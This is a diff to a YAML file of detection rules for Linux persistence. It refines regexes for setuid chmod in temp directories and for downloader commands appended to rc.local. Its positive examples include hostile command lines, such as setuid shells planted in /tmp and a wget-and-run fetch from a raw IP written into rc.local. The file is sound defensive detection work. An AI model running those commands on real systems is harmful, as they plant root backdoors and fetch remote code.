@@ -304,9 +304,9 @@
       - 'Nov 20 13:09:02 web01 bash[824]: HISTORY: echo /opt/lib > /etc/ld.so.conf.d/opt.conf'
 
 - id: mention.persist_setuid_in_temp
-  title: 'chmod setuid mode on a temp-directory path'
+  title: 'chmod setuid mode on a file directly under a temp directory'
   match:
-    anchored: 'chmod {1,3}(?:u\+s|\+s|[4567][0-7]{3}) {1,3}(?:/tmp/|/dev/shm/|/var/tmp/)[^\s;&|]{1,100}'
+    anchored: 'chmod {1,3}(?:u\+s|\+s|[4567][0-7]{3}) {1,3}(?:/tmp/|/dev/shm/|/var/tmp/)[^\s;&|/]{1,60}(?:[\s;&|]|$)'
   case_sensitive: true
   strength: strong
   attack: [T1548.001]
@@ -317,10 +317,10 @@
     license: DRL-1.1
     upstream_id: c21c4eaa-ba2e-419a-92b2-8371703cbe21
   rationale: >-
-    Narrows the rule (chown root plus chmod u+s or g+s on one command line) to a setuid mode applied directly to a
-    path in a world-writable temp directory, a planted privilege-escalation backdoor. The rule's 'chown root'
-    requirement is dropped because the chown is often a separate log line; setgid modes (2775 on shared directories)
-    and paths after '&&' or ';' are not matched. Packages install setuid binaries under /usr, never in /tmp.
+    Narrows the rule (chown root plus chmod u+s or g+s on one command line) to a setuid mode on a file directly under
+    /tmp, /dev/shm or /var/tmp, a planted privilege-escalation backdoor. The rule's 'chown root' requirement is
+    dropped because the chown is often a separate log line; setgid modes, paths after '&&' or ';', and files in nested
+    build trees (the medium entry) are not matched. Packages install setuid binaries under /usr.
   examples:
     positive:
       - 'Nov 20 13:10:00 web01 bash[825]: HISTORY: chmod 4755 /tmp/.bash'
@@ -330,6 +330,30 @@
       - 'Nov 20 13:10:03 web01 bash[828]: HISTORY: chmod 755 /tmp/build/run.sh'
       - 'Nov 20 13:10:04 web01 bash[828]: HISTORY: chmod 2775 /tmp/shared'
       - 'Nov 20 13:10:05 web01 bash[828]: HISTORY: chmod 4755 /usr/local/bin/tool && cp build.log /tmp/'
+      - 'Nov 20 13:10:09 build01 bash[832]: HISTORY: chmod 4755 /tmp/build/helper'
+
+- id: mention.persist_setuid_in_temp_subdir
+  title: chmod setuid mode on a file in a temp subdirectory
+  match:
+    anchored: 'chmod {1,3}(?:u\+s|\+s|[4567][0-7]{3}) {1,3}(?:/tmp/|/dev/shm/|/var/tmp/)[^\s;&|/]{1,60}/[^\s;&|]{1,100}'
+  case_sensitive: true
+  strength: medium
+  attack: [T1548.001]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Setuid and Setgid (Ömer Günal)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_setgid_setuid.yml
+    license: DRL-1.1
+    upstream_id: c21c4eaa-ba2e-419a-92b2-8371703cbe21
+  rationale: >-
+    A setuid mode on a file inside a temp subdirectory. Package and test builds set setuid bits in staging trees under
+    /tmp before installing, so it is medium; a hidden name or a shell binary decides.
+  examples:
+    positive:
+      - 'Nov 20 13:10:10 web01 bash[833]: HISTORY: chmod 4755 /tmp/.x/sh'
+    negative:
+      - 'Nov 20 13:10:11 web01 bash[834]: HISTORY: chmod 755 /tmp/build/run.sh'
+      - 'Nov 20 13:10:12 web01 bash[835]: HISTORY: chmod 644 /tmp/build/notes.txt'
 
 - id: mention.persist_setgid_in_temp
   title: chmod setgid mode on a temp-directory path
@@ -552,9 +576,9 @@
       - 'echo ''export http_proxy=http://proxy:3128; curl -s https://status.example.org/'' >> ~/.bashrc'
 
 - id: mention.persist_rc_local_payload
-  title: 'echo of a downloader-with-shell or socket command into rc.local'
+  title: 'echo of a plain-http or raw-IP downloader-with-shell, or socket, command into rc.local'
   match:
-    anchored: 'echo [^\n]{1,100}(?:(?:curl|wget) [^\n|]{1,150}(?:\| {0,3}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b|&& {0,2}(?:sh|bash) )|/dev/tcp/)[^\n]{0,60}>> {0,2}/etc/rc\.local'
+    anchored: 'echo [^\n]{1,100}(?:(?:curl|wget) [^\n|]{0,60}(?:http://|https://[0-9]{1,3}\.)[^\n|]{0,100}(?:\| {0,3}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b|&& {0,2}(?:sh|bash) )|/dev/tcp/)[^\n]{0,60}>> {0,2}/etc/rc\.local'
   case_sensitive: true
   strength: strong
   attack: [T1037.004, T1105]
@@ -565,9 +589,9 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1037.004
   rationale: >-
-    Author-composed shape from T1037.004: rc.local runs as root at boot; appending a fetch that is then run by a
-    shell, or a bash socket, is boot persistence used by botnets. Plain downloads echoed into rc.local are not
-    matched.
+    Author-composed shape from T1037.004: rc.local runs as root at boot; appending a plain-HTTP or raw-IP fetch that a
+    shell then runs, or a bash socket, is boot persistence used by botnets. A vendor agent installed with 'curl
+    https://<vendor host>/... | bash' into rc.local is the separate medium entry.
   examples:
     positive:
       - 'Nov 20 13:18:00 web01 sh[848]: echo "wget -q http://203.0.113.7/b -O /tmp/b && sh /tmp/b &" >> /etc/rc.local'
@@ -575,6 +599,30 @@
       - 'Nov 20 13:18:01 web01 bash[849]: HISTORY: echo "/usr/local/bin/fan-control &" >> /etc/rc.local'
       - 'Nov 20 13:18:02 web01 bash[850]: HISTORY: cat /etc/rc.local'
       - 'echo "curl -s -o /var/cache/motd.txt https://intranet.example.org/motd" >> /etc/rc.local'
+      - 'Nov 20 13:18:06 web01 sh[854]: echo "curl -fsSL https://get.vendor.example.com/agent.sh | bash" >> /etc/rc.local'
+
+- id: mention.persist_rc_local_https_installer
+  title: echo of an https downloader-with-shell command into rc.local
+  match:
+    anchored: 'echo [^\n]{1,100}(?:curl|wget) [^\n|]{1,150}(?:\| {0,3}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b|&& {0,2}(?:sh|bash) )[^\n]{0,60}>> {0,2}/etc/rc\.local'
+  case_sensitive: true
+  strength: medium
+  attack: [T1037.004, T1105]
+  telemetry: [linux_text]
+  source:
+    name: MITRE ATT&CK Enterprise 20.0, T1037.004 RC Scripts
+    url: https://attack.mitre.org/techniques/T1037/004
+    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
+    upstream_id: T1037.004
+  rationale: >-
+    Author-composed shape from the technique text: any downloader run by a shell, appended to rc.local. Some vendor
+    agents are bootstrapped this way from their HTTPS host, so it is medium; the host decides.
+  examples:
+    positive:
+      - 'Nov 20 13:18:03 web01 sh[851]: echo "curl -fsSL https://get.vendor.example.com/agent.sh | bash" >> /etc/rc.local'
+    negative:
+      - 'Nov 20 13:18:04 web01 bash[852]: HISTORY: echo "/usr/local/bin/fan-control &" >> /etc/rc.local'
+      - 'Nov 20 13:18:05 web01 bash[853]: HISTORY: cat /etc/rc.local'
 
 - id: mention.persist_insmod_from_temp
   title: 'insmod of a .ko file in a temp directory (command text)'
